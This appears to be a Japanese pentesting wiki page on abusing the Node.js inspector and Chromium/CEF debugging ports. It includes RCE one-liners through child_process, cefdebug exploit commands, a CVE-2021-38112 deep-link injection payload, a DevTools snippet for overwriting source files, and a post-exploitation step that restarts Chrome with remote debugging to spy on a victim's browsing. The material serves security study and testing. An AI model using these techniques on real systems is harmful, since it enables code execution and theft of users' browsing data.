# Node inspector/CEF debug abuse

Historical practical examples include the Multimaster walkthrough and the CVE-2019-1414 Visual Studio Code debugger attack; use them as version-specific context rather than assuming every current Electron or Chromium target exposes the same primitives.<sup>[[1]](#references)[[3]](#references)</sup>

## 基本情報

[ドキュメントより](https://nodejs.org/learn/getting-started/debugging): `--inspect` switch を指定して起動すると、Node.js process は debugging client の接続を待ち受けます。**デフォルト**では、host として **`127.0.0.1`**、port として **`9229`** で待ち受けます。各 process には **一意の** **UUID** も割り当てられます。<sup>[[4]](#references)</sup>

Inspector client は、接続するために host address、port、UUID を把握して指定する必要があります。完全な URL は、次のようになります: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`。<sup>[[4]](#references)</sup>

> [!WARNING]
> **debugger は Node.js execution environment に完全にアクセスできる**ため、この port に接続可能な悪意ある攻撃者は、Node.js process の権限で arbitrary code を実行できる可能性があります（**potential privilege escalation**）。<sup>[[4]](#references)</sup>

Inspector を起動する方法はいくつかあります:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
inspectされたプロセスを起動すると、次のようなものが表示されます:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF**（**Chromium Embedded Framework**）ベースのプロセスでは、`--remote-debugging-port=9222` を指定して debugger を公開できます。これにより、Node.js inspector ではなく [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 経由で browser が公開されるため、Node.js の `process` ベースの payload はデフォルトでは直接適用できません。<sup>[[2]](#references)[[5]](#references)</sup>

debugger 付きで browser を起動すると、次のような内容が表示されます。<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers、WebSockets、same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Web-browserで開かれたWebサイトは、ブラウザーのセキュリティモデルに従ってWebSocketおよびHTTPリクエストを送信できます。**一意のdebugger session idを取得する**には、**初期HTTP接続**が必要です。**same-origin-policy**により、Webサイトが**このHTTP接続**を確立することは**防止**されます。[**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**に対する**追加のセキュリティとして、Node.jsは接続の**'Host' headers**が正確に**IP address**または**`localhost`**のいずれかを指定していることを検証します。<sup>[[4]](#references)</sup>

> [!TIP]
> この**security measureにより、単にHTTP requestを送信するだけ**（SSRF vulnを悪用すれば可能）でinspectorをexploitしてコードを実行することが**防止されます**。<sup>[[4]](#references)</sup>

### 実行中のprocessでinspectorを起動する

実行中のnodejs processに**signal SIGUSR1**を送信すると、default portで**inspectorを起動**できます。ただし、十分なprivilegesが必要であるため、これによって**process内の情報へのprivileged access**が得られる可能性はありますが、直接的なprivilege escalationにはなりません。<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> これはコンテナで有用です。プロセスとともに**コンテナ**も**kill**されるため、`--inspect` を指定して**プロセスをシャットダウンし、新しいプロセスを起動する**ことは**選択肢になりません**。<sup>[[6]](#references)</sup>

### inspector/debugger に接続する

**Chromium-based browser** に接続するには、Chrome または Edge で、それぞれ `chrome://inspect` または `edge://inspect` URL にアクセスできます。Configure ボタンをクリックし、**target host と port** が正しく一覧に表示されていることを確認します。この画像は Remote Code Execution (RCE) の例を示しています。<sup>[[2]](#references)[[4]](#references)</sup>

![debugger にアクセスする URL が表示されます。例: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger に接続する: Chromium-based browser に接続するには、...](<../../images/image (674).png>)

**command line** を使用すると、以下のように debugger/inspector に接続できます。<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
ツール [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) を使うと、ローカルで実行中の **inspectors** を **find** し、それらに **code** を **inject** できます。<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 経由で browser に接続している場合、**NodeJS RCE exploits** は機能しないことに注意してください（API を確認して、これを使ってできる興味深いことを見つける必要があります）。<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector における RCE

> [!TIP]
> [**Electron の XSS から RCE を取得する方法を探してここに来た場合は、このページを確認してください。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

**inspector** に **connect** できる場合に **RCE** を取得する一般的な方法として、次のようなものがあります（**Chrome DevTools protocol** への接続では機能しないようです）。<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

APIはこちらで確認できます: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)。<sup>[[5]](#references)</sup>
このセクションでは、この protocol を exploit するために人々が使用した興味深い手法を列挙します。

### Deep Links 経由の Parameter Injection

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) では、Rhino security が、CEF をベースとするアプリケーションがシステムにカスタム UR**I** (workspaces://index.html) を **登録し**、完全な URI を受け取った後、その URI から一部が構築された configuration を使って **CEF ベースのアプリケーションを起動**していたことを発見しました。<sup>[[8]](#references)</sup>

URI の parameter が URL decode され、CEF ベースのアプリケーションの起動に使用されていることが判明しました。これにより、ユーザーは **command line** に flag **`--gpu-launcher`** を **inject** して、任意の処理を実行できました。<sup>[[8]](#references)</sup>

そのため、次のような payload が使用できます:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
calc.exeを実行します。<sup>[[8]](#references)</sup>

### ファイルの上書き

**ダウンロードしたファイルの保存先**フォルダーを変更し、ファイルをダウンロードして、アプリケーションで頻繁に使用される**ソースコード**を**悪意のあるコード**で上書きします。<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCEとexfiltration

STAR Labsは、公開されたWebDriver/CDP servicesによって任意のfile readsとRCEが可能になり、一部のconfigurationsではDNS rebindingによってexploit chainを完成できることを示しました。<sup>[[9]](#references)</sup>

browser-automationとChromium securityに関する過去の事例については、Counter WebDriver write-upおよびProject Zero issues 773、1742、1944も参照してください。<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

実環境で、Chrome/Chromium based browserを使用しているuser PCを**compromisingした後**、**debuggingをactivatedにしてdebugging portをport-forward**し、アクセスできるようにChrome processをlaunchできます。これにより、**victimがChromeで行うすべての操作をinspectし、sensitive informationをstealできます**。<sup>[[7]](#references)</sup>

stealthな方法は、**すべてのChrome processをterminate**してから、次のようなコマンドをcallすることです。<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger の検査および exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger 経由の Visual Studio Code Remote Code Execution](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Getting Started](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Chrome の Debugging Feature を悪用して Browsing Sessions をリモートから監視および制御する](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - DNS Rebinding と CDP による WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Bot から RCE へ](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
